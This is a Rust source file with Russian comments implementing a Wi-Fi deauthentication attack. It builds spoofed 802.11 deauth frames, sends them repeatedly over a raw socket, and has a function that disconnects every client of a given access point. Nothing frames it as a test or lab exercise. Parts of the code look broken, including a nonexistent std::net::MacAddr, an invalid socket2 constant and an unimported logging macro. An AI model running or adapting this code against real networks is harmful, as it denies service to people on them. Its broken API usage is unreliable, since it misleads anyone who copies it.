use anyhow::Result;
use pcap::Packet;
use std::net::MacAddr;
use std::process::Command;

/// Структура для деаутентификационного пакета
#[repr(packed)]
struct DeauthPacket {
    frame_control: u16,
    duration: u16,
    destination: [u8; 6],
    source: [u8; 6],
    bssid: [u8; 6],
    sequence: u16,
    reason: u16,
}

impl DeauthPacket {
    fn new(destination: MacAddr, source: MacAddr, bssid: MacAddr) -> Self {
        DeauthPacket {
            frame_control: 0x00C0, // Type: Management, Subtype: Deauthentication
            duration: 0,
            destination: destination.octets(),
            source: source.octets(),
            bssid: bssid.octets(),
            sequence: 0,
            reason: 0x0007, // Class 3 frame received from nonassociated station
        }
    }
}

/// Отправка деаутентификационного пакета
pub fn send_deauth(interface: &str, target_mac: MacAddr, ap_mac: MacAddr) -> Result<()> {
    // Создаем raw сокет
    let socket = socket2::Socket::new(
        socket2::Domain::PACKET,
        socket2::Type::RAW,
        Some(socket2::Protocol::ETH_P_ALL),
    )?;

    // Привязываем сокет к интерфейсу
    let iface = pcap::Device::list()?
        .into_iter()
        .find(|d| d.name == interface)
        .ok_or_else(|| anyhow::anyhow!("Interface not found"))?;

    let addr = socket2::SockAddr::packet(iface.addresses[0].addr.unwrap());
    socket.bind(&addr)?;

    // Создаем и отправляем пакеты
    let deauth_packet = DeauthPacket::new(target_mac, ap_mac, ap_mac);
    let packet_bytes = unsafe {
        std::slice::from_raw_parts(
            &deauth_packet as *const _ as *const u8,
            std::mem::size_of::<DeauthPacket>(),
        )
    };

    // Отправляем пакет несколько раз для надежности
    for _ in 0..10 {
        socket.send(packet_bytes)?;
        std::thread::sleep(std::time::Duration::from_millis(100));
    }

    Ok(())
}

/// Деаутентификация всех клиентов точки доступа
pub fn deauth_all_clients(interface: &str, ap_mac: MacAddr, clients: &[MacAddr]) -> Result<()> {
    for client in clients {
        info!("Отправка деаутентификационного пакета клиенту {}", client);
        send_deauth(interface, *client, ap_mac)?;
    }
    Ok(())
} 